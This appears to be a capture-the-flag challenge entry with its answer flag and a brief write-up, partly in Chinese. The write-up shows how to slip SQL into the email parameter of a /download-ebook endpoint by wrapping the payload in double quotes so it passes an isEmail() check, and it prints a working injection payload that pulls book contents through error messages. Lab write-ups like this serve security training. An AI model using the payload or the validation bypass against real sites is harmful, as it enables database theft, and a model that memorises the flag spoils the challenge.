# Description
LONG DESC

# Difficulty
⭐⭐⭐⭐⭐

# Flag
`mayctf{Y0u_9et_s3n5itive_d4ta!!!}`

# Platform (Optional)
ARCH

# Hint (Optional)
SQL注入

# WriteUp
这题难度偏大，不太适合新人（总得出一两个难题看看有没有大佬不是吗

## 考点
 - 审计代码找到注入点 注入点位于 `/download-ebook`的`email`参数
 - 绕过isEmail()，可以通过查看isEmail的源码或者google找到绕过方式，`""`
 - sql注入，注意这里会输出报错信息

## 绕过isEmail()
当email以`"`开头时，可以包裹任意字符

如`"', 1 and 0);#"@a.aa`，isEmail函数会检测其为合法字符

## payload

`"',1 and substring((select texts from books where id=1),1,99));#"@a.aa`

